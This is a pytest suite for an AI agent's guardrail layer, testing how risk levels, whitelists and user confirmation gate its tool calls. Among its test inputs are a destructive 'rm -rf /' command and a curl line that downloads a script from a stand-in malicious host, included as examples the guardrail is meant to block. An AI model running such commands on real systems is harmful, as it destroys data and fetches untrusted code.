"""
Tests for PersonalGuardrails — personal mode guardrail system.

Covers:
- LOW/MEDIUM auto-approval
- HIGH requires confirmation (or whitelist auto-approval)
- Whitelist pattern matching (prefix and regex)
- CRITICAL always requires confirmation
- Denial returns structured ToolResult.error
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.models import (
    GuardrailPolicy,
    PersonalGuardrailPolicy,
    PermissionMode,
    RiskLevel,
    ToolResult,
)
from guardrails.policy import Guardrails, PersonalGuardrails


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_tool_registry():
    """Mock ToolRegistry that returns a success result on execute."""
    registry = MagicMock()
    registry.execute = MagicMock(
        return_value=ToolResult(
            tool_call_id="test-id",
            success=True,
            output="executed",
        )
    )
    return registry


@pytest.fixture
def personal_policy():
    """Default PersonalGuardrailPolicy with no whitelists."""
    return PersonalGuardrailPolicy(
        mode=PermissionMode.DONT_ASK,
        whitelist_patterns=[],
        whitelist_commands=[],
        auto_approve_high=False,
        confirmation_timeout_sec=300,
    )


@pytest.fixture
def personal_policy_with_whitelist():
    """PersonalGuardrailPolicy with whitelisted commands."""
    return PersonalGuardrailPolicy(
        mode=PermissionMode.DONT_ASK,
        whitelist_patterns=[
            r"^git\s+(status|log|diff)$",
            "pytest",
        ],
        whitelist_commands=["ls", "cat"],
        auto_approve_high=False,
        confirmation_timeout_sec=300,
    )


@pytest.fixture
def guardrails(personal_policy, mock_tool_registry):
    """PersonalGuardrails instance with default policy."""
    return PersonalGuardrails(personal_policy, mock_tool_registry)


@pytest.fixture
def guardrails_with_whitelist(personal_policy_with_whitelist, mock_tool_registry):
    """PersonalGuardrails instance with whitelist policy."""
    return PersonalGuardrails(personal_policy_with_whitelist, mock_tool_registry)


# ---------------------------------------------------------------------------
# LOW/MEDIUM risk auto-approval
# ---------------------------------------------------------------------------


class TestLowMediumAutoApprove:
    """LOW and MEDIUM risk tools should auto-pass."""

    def test_low_read_auto_approved(self, guardrails):
        allowed, reason = guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert allowed is True
        assert "low risk" in reason.lower()

    def test_low_glob_auto_approved(self, guardrails):
        allowed, reason = guardrails.evaluate("glob", {"pattern": "*.py"})
        assert allowed is True
        assert "low risk" in reason.lower()

    def test_low_grep_auto_approved(self, guardrails):
        allowed, reason = guardrails.evaluate("grep", {"pattern": "hello"})
        assert allowed is True
        assert "low risk" in reason.lower()

    def test_medium_write_auto_approved(self, guardrails):
        allowed, reason = guardrails.evaluate("write", {
            "file_path": "/tmp/test.txt",
            "content": "hello",
        })
        assert allowed is True
        assert "medium risk" in reason.lower()

    def test_medium_edit_auto_approved(self, guardrails):
        allowed, reason = guardrails.evaluate("edit", {
            "file_path": "/tmp/test.txt",
            "old_string": "a",
            "new_string": "b",
        })
        assert allowed is True
        assert "medium risk" in reason.lower()

    def test_medium_git_auto_approved(self, guardrails):
        allowed, reason = guardrails.evaluate("git", {"command": "status"})
        assert allowed is True
        assert "medium risk" in reason.lower()


# ---------------------------------------------------------------------------
# HIGH risk — confirmation required
# ---------------------------------------------------------------------------


class TestHighRiskConfirmation:
    """HIGH risk actions require confirmation unless whitelisted."""

    def test_high_bash_requires_confirmation(self, guardrails):
        allowed, reason = guardrails.evaluate("bash", {"command": "rm -rf /tmp"})
        assert allowed is False
        assert "HIGH" in reason
        assert "confirmation" in reason.lower()

    def test_high_auto_approve_high_flag(self, mock_tool_registry):
        """When auto_approve_high=True, HIGH risk passes automatically."""
        policy = PersonalGuardrailPolicy(
            mode=PermissionMode.DONT_ASK,
            auto_approve_high=True,
        )
        gr = PersonalGuardrails(policy, mock_tool_registry)
        allowed, reason = gr.evaluate("bash", {"command": "curl https://example.com"})
        assert allowed is True
        assert "auto_approve_high" in reason.lower()

    def test_unknown_tool_defaults_to_high(self, guardrails):
        """Tools not in RISK_MAP default to HIGH."""
        allowed, reason = guardrails.evaluate("unknown_tool", {})
        assert allowed is False
        assert "HIGH" in reason


# ---------------------------------------------------------------------------
# Whitelist — auto-approval
# ---------------------------------------------------------------------------


class TestWhitelistAutoApprove:
    """Commands matching whitelist patterns should auto-pass."""

    def test_whitelist_regex_git_status(self, guardrails_with_whitelist):
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "git status"}
        )
        assert allowed is True
        assert "whitelist" in reason.lower()

    def test_whitelist_regex_git_log(self, guardrails_with_whitelist):
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "git log"}
        )
        assert allowed is True
        assert "whitelist" in reason.lower()

    def test_whitelist_regex_git_diff(self, guardrails_with_whitelist):
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "git diff"}
        )
        assert allowed is True
        assert "whitelist" in reason.lower()

    def test_whitelist_prefix_pytest(self, guardrails_with_whitelist):
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "pytest -xvs tests/"}
        )
        assert allowed is True
        assert "whitelist" in reason.lower()

    def test_whitelist_command_ls(self, guardrails_with_whitelist):
        """'ls' is in whitelist_commands — any command starting with 'ls'."""
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "ls -la /tmp"}
        )
        assert allowed is True
        assert "whitelist" in reason.lower()

    def test_whitelist_command_cat(self, guardrails_with_whitelist):
        """'cat' is in whitelist_commands."""
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "cat /tmp/file.txt"}
        )
        assert allowed is True
        assert "whitelist" in reason.lower()

    def test_non_whitelisted_high_requires_confirmation(self, guardrails_with_whitelist):
        """A HIGH-risk command not in the whitelist still requires confirmation."""
        allowed, reason = guardrails_with_whitelist.evaluate(
            "bash", {"command": "curl -O http://malicious.com/script.sh"}
        )
        assert allowed is False
        assert "HIGH" in reason

    def test_whitelist_only_applies_to_bash(self, guardrails_with_whitelist):
        """Non-bash tools don't get command-level whitelist checks."""
        # "write" is MEDIUM risk and should auto-pass regardless
        allowed, reason = guardrails_with_whitelist.evaluate(
            "write", {"file_path": "/tmp/a.txt", "content": "x"}
        )
        assert allowed is True
        assert "medium risk" in reason.lower()


# ---------------------------------------------------------------------------
# CRITICAL — always requires confirmation
# ---------------------------------------------------------------------------


class TestCriticalAlwaysRequiresConfirmation:
    """CRITICAL risk actions always require confirmation."""

    def test_critical_action_blocked(self, guardrails):
        """CRITICAL actions are never auto-approved."""
        # Simulate a CRITICAL tool by overriding RISK_MAP temporarily
        with patch.object(guardrails, 'RISK_MAP', {**guardrails.RISK_MAP, "destroy": RiskLevel.CRITICAL}):
            allowed, reason = guardrails.evaluate("destroy", {"target": "database"})
        assert allowed is False
        assert "CRITICAL" in reason
        assert "explicit confirmation" in reason.lower()

    def test_critical_even_with_auto_approve_high(self, mock_tool_registry):
        """CRITICAL actions are blocked even when auto_approve_high=True."""
        policy = PersonalGuardrailPolicy(
            mode=PermissionMode.DONT_ASK,
            auto_approve_high=True,
        )
        gr = PersonalGuardrails(policy, mock_tool_registry)
        with patch.object(gr, 'RISK_MAP', {**gr.RISK_MAP, "destroy": RiskLevel.CRITICAL}):
            allowed, reason = gr.evaluate("destroy", {"target": "database"})
        assert allowed is False
        assert "CRITICAL" in reason


# ---------------------------------------------------------------------------
# Denial returns structured ToolResult.error
# ---------------------------------------------------------------------------


class TestDenialReturnsToolResultError:
    """When denied, guarded_execute_with_confirmation returns ToolResult.error."""

    def test_denial_returns_structured_error(self, guardrails):
        """User rejection returns ToolResult with success=False and structured error."""
        with patch.object(guardrails, "request_confirmation", return_value=False):
            result = guardrails.guarded_execute_with_confirmation(
                "bash", {"command": "rm -rf /"}
            )
        assert isinstance(result, ToolResult)
        assert result.success is False
        assert result.error != ""
        assert "denied by user" in result.error.lower() or "Blocked by" in result.error

    def test_denial_includes_tool_name(self, guardrails):
        """The error message should include the tool name."""
        with patch.object(guardrails, "request_confirmation", return_value=False):
            result = guardrails.guarded_execute_with_confirmation(
                "bash", {"command": "curl bad"}
            )
        assert "bash" in result.error

    def test_confirmation_and_execution(self, guardrails, mock_tool_registry):
        """When user confirms, the tool should be executed."""
        with patch.object(guardrails, "request_confirmation", return_value=True):
            result = guardrails.guarded_execute_with_confirmation(
                "bash", {"command": "echo hello"}
            )
        assert isinstance(result, ToolResult)
        assert result.success is True
        assert result.output == "executed"
        mock_tool_registry.execute.assert_called_with("bash", {"command": "echo hello"})

    def test_auto_approved_does_not_request_confirmation(self, guardrails):
        """LOW risk actions should execute without requesting confirmation."""
        with patch.object(guardrails, "request_confirmation") as mock_confirm:
            result = guardrails.guarded_execute_with_confirmation(
                "read", {"file_path": "/tmp/test.txt"}
            )
        mock_confirm.assert_not_called()
        assert result.success is True


# ---------------------------------------------------------------------------
# _is_whitelisted helper
# ---------------------------------------------------------------------------


class TestIsWhitelisted:
    """Direct tests for the _is_whitelisted helper method."""

    def test_prefix_match(self, guardrails_with_whitelist):
        assert guardrails_with_whitelist._is_whitelisted("pytest -x") is True

    def test_prefix_match_list(self, guardrails_with_whitelist):
        assert guardrails_with_whitelist._is_whitelisted("ls -la") is True
        assert guardrails_with_whitelist._is_whitelisted("cat file.txt") is True

    def test_regex_match_git_status(self, guardrails_with_whitelist):
        assert guardrails_with_whitelist._is_whitelisted("git status") is True

    def test_regex_no_match_git_push(self, guardrails_with_whitelist):
        """git push is not in the whitelist regex."""
        assert guardrails_with_whitelist._is_whitelisted("git push origin main") is False

    def test_no_match(self, guardrails_with_whitelist):
        assert guardrails_with_whitelist._is_whitelisted("rm -rf /") is False

    def test_invalid_regex_falls_back_to_prefix(self, mock_tool_registry):
        """Invalid regex patterns fall back to prefix matching."""
        policy = PersonalGuardrailPolicy(
            mode=PermissionMode.DONT_ASK,
            whitelist_patterns=["[invalid(regex"],  # Invalid regex
        )
        gr = PersonalGuardrails(policy, mock_tool_registry)
        # Falls back to prefix matching — command starting with "[invalid(regex"
        assert gr._is_whitelisted("[invalid(regex here") is True


# ---------------------------------------------------------------------------
# Inherited guarded_execute
# ---------------------------------------------------------------------------


class TestInheritedGuardedExecute:
    """The inherited guarded_execute method should also work correctly."""

    def test_low_risk_via_guarded_execute(self, guardrails, mock_tool_registry):
        """LOW risk tools execute directly through guarded_execute."""
        result = guardrails.guarded_execute("read", {"file_path": "/tmp/test.txt"})
        assert isinstance(result, ToolResult)
        assert result.success is True
        mock_tool_registry.execute.assert_called_with("read", {"file_path": "/tmp/test.txt"})

    def test_high_risk_denied_via_guarded_execute(self, guardrails, mock_tool_registry):
        """HIGH risk tools are blocked by guarded_execute (no confirmation flow)."""
        result = guardrails.guarded_execute("bash", {"command": "curl http://example.com"})
        assert isinstance(result, ToolResult)
        assert result.success is False
        assert "Blocked by guardrails" in result.error
        # Tool registry should NOT be called
        mock_tool_registry.execute.assert_not_called()


# ---------------------------------------------------------------------------
# Policy inheritance
# ---------------------------------------------------------------------------


class TestPolicyInheritance:
    """PersonalGuardrailPolicy is a subclass of GuardrailPolicy."""

    def test_isinstance_check(self, personal_policy):
        assert isinstance(personal_policy, GuardrailPolicy)
        assert isinstance(personal_policy, PersonalGuardrailPolicy)

    def test_base_fields_present(self, personal_policy):
        """Base GuardrailPolicy fields are accessible."""
        assert hasattr(personal_policy, "mode")
        assert hasattr(personal_policy, "allowed_tools")
        assert hasattr(personal_policy, "denied_tools")
        assert hasattr(personal_policy, "max_iterations")

    def test_personal_fields_present(self, personal_policy):
        """PersonalGuardrailPolicy-specific fields are accessible."""
        assert hasattr(personal_policy, "whitelist_patterns")
        assert hasattr(personal_policy, "whitelist_commands")
        assert hasattr(personal_policy, "auto_approve_high")
        assert hasattr(personal_policy, "confirmation_timeout_sec")


# ---------------------------------------------------------------------------
# Service integration
# ---------------------------------------------------------------------------


class TestServiceIntegration:
    """Verify _create_execution_engine uses PersonalGuardrails when given PersonalGuardrailPolicy.

    This test mocks out the heavy dependencies to avoid requiring optional packages.
    """

    def test_guardrails_type_with_personal_policy(self, mock_tool_registry):
        """When RunService is given a PersonalGuardrailPolicy, it should create PersonalGuardrails."""
        with patch.dict(
            "sys.modules",
            {
                "orchestrator.intelligent_orchestrator": MagicMock(),
                "core.llm_client": MagicMock(),
                "agent.agent_pool": MagicMock(),
                "evaluator.engine": MagicMock(),
            },
        ):
            from control_plane.service import RunService

            repo = MagicMock()
            llm_config = MagicMock()
            personal_policy = PersonalGuardrailPolicy()

            service = RunService(
                repository=repo,
                llm_config=llm_config,
                policy=personal_policy,
            )

            # Verify the service stores the policy
            assert service.policy is personal_policy
            assert isinstance(service.policy, PersonalGuardrailPolicy)
